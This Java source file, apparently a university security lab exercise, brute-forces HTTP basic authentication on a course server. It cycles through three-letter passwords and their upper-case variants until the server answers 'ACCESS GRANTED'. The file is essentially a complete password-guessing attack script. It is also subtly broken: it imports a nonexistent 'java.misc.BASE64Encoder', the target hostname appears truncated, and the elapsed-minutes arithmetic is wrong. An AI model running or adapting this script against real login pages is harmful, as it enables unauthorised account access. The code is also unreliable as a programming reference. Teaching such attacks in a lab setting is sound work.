	


import java.io.*;
import java.net.*;

import java.util.*;

import java.misc.BASE64Encoder;

public class BruteForce {

  private String userId;
  private String password;

  private StringBuffer seed= new StringBuffer("aaa");
  private int tries = 1;	


	
  public BruteForce() {


    
    Authenticator.setDefault (new MyAuthenticator());
  }

  public String fetchURL (String urlString) {
	HttpURLConnection connection;
	StringBuffer sb = new StringBuffer();
	Date startTime, endTime;
	int responseCode = -1;
	boolean retry = true;	
	
    URL url;
    startTime = new Date();
    
    System.out.println (" time :" + startTime);

	while (retry == true)
	{
	
	    try {

			url = new URL (urlString);

			connection = (HttpURLConnection)url.openConnection();

			setUserId("");
			setPassword("rhk8611");

			System.out.println("Attempting  get a response : " +connection.getURL() );
			responseCode = connection.getResponseCode();
			System.out.print(responseCode + " ");

			if (responseCode == HttpURLConnection.HTTP_OK) 
			{
				retry = false;
				System.out.println("**** ACCESS GRANTED *****");
			} else
			{
				retry = true;
				throw new IOException(
					"HTTP response : " + String.valueOf(responseCode) + 
					"\nResponse Message: " +connection.getResponseMessage());
				
			}

			InputStream content = (InputStream)url.getContent();
			BufferedReader in   = 
			new BufferedReader (new InputStreamReader (content));
			String line;
				while ((line = in.readLine()) != null) {
					sb.append(line);
				}
			} catch (MalformedURLException e) {
				
				retry=false;
				System.out.println ("Invalid URL" + e.getMessage());
			} catch (IOException e) {
				
				retry=true;
				connection = null;
				System.out.println ("Error  URL \n" + e.getMessage());
			}
		}	
		endTime = new Date();
		System.out.print ("Total Time taken :" + (endTime.getTime() - startTime.getTime())/1000*60 + " Minutes ");
		System.out.println ((endTime.getTime() - startTime.getTime())/1000 + " Sec");
		
		
	return sb.toString();
  }


  public static void main (String args[]) {
	BruteForce myGenerator = new BruteForce();


	


	System.out.println("Starting seed is : "+ myGenerator.getSeed() );
	String pageFound = myGenerator.fetchURL("http://sec-crack.cs.rmit.edu./SEC/2/");
		
	System.out.println(" ACCESSED ->\n" + pageFound);
  }

  class MyAuthenticator extends Authenticator {
    protected PasswordAuthentication getPasswordAuthentication()
	{
		String username = getUserId();
		String pass = getPassword();	
		if (pass.equals("ZZZ"))
		{
			System.out.println("\nReached the end of combinations. EXITING.\n");
			System.exit(0);
		}
		if ((tries % 8) == 0 )
		{
			pass = "" + getNextPassword();
		}else 
		{
			pass = ""+ getNextPasswordCase(""+getSeed(), tries%8);
		}
		tries ++;

	  System.out.println(tries + " Authenticating with -> " + pass);

	  return new PasswordAuthentication (username, pass.toCharArray());
	  
    }
  }
	
	public String getPassword()
	{
		return this.password;
	}

	public void setPassword(String password)
	{
		this.password = password;
	}

	
	public String getUserId()
	{
		return this.userId;
	}

	public void setUserId(String userId)
	{
		this.userId = userId;
	}

	public StringBuffer getNextPassword()
	{
		final int STRING_RADIX = 36;
		
		int changeDigit;
		int dig;
		char cdig;
		
		
		changeDigit = 2;
		if (getSeed().charAt(changeDigit) < 'z')
		{
			dig = Character.digit(getSeed().charAt(changeDigit), STRING_RADIX);
			dig = dig + 1;
			cdig = Character.forDigit(dig, STRING_RADIX);
			seed.setCharAt(changeDigit,cdig);
				
		} else
		{
			
			seed.setCharAt(2,'a');
			
			
			changeDigit = 1;
			if (getSeed().charAt(changeDigit) < 'z')
			{
				dig = Character.digit(getSeed().charAt(changeDigit), STRING_RADIX);
				dig = dig + 1;
				cdig = Character.forDigit(dig, STRING_RADIX);
				seed.setCharAt(changeDigit,cdig);
			} else
			{
				
				seed.setCharAt(2,'a');
				
				seed.setCharAt(1,'a');
				
				
				changeDigit = 0;
				if (getSeed().charAt(changeDigit) < 'z')
				{
					dig = Character.digit(getSeed().charAt(changeDigit), STRING_RADIX);
					dig = dig + 1;
					cdig = Character.forDigit(dig, STRING_RADIX);
					seed.setCharAt(changeDigit,cdig);
				}
				
			}
			
		}

		return getSeed();
	
	}

	private StringBuffer getNextPasswordCase(String pwd, int inx)
	{
		StringBuffer casePwd = new StringBuffer(pwd);
		char myChar;
		switch (inx)
		{
			case 1:
				myChar = pwd.charAt(0);
				casePwd.setCharAt(0, Character.toUpperCase(myChar));
				break;
			case 2:
				myChar = pwd.charAt(1);
				casePwd.setCharAt(1, Character.toUpperCase(myChar));
				break;
			case 3:
				myChar = pwd.charAt(2);
				casePwd.setCharAt(2, Character.toUpperCase(myChar));
				break;
			case 4:
				myChar = pwd.charAt(0);
				casePwd.setCharAt(0, Character.toUpperCase(myChar));
				myChar = pwd.charAt(1);
				casePwd.setCharAt(1, Character.toUpperCase(myChar));
				break;
			case 5:
				myChar = pwd.charAt(0);
				casePwd.setCharAt(0, Character.toUpperCase(myChar));
				myChar = pwd.charAt(2);
				casePwd.setCharAt(2, Character.toUpperCase(myChar));
				break;
			case 6:
				myChar = pwd.charAt(1);
				casePwd.setCharAt(1, Character.toUpperCase(myChar));
				myChar = pwd.charAt(2);
				casePwd.setCharAt(2, Character.toUpperCase(myChar));
				break;
			case 7:
				myChar = pwd.charAt(0);
				casePwd.setCharAt(0, Character.toUpperCase(myChar));
				myChar = pwd.charAt(1);
				casePwd.setCharAt(1, Character.toUpperCase(myChar));
				myChar = pwd.charAt(2);
				casePwd.setCharAt(2, Character.toUpperCase(myChar));
				break;
		}
		return(casePwd);
		
	}	
	public StringBuffer getSeed()
	{
		return this.seed;
	}

	public void setSeed(StringBuffer seed)
	{
		this.seed = seed;
	}



}  


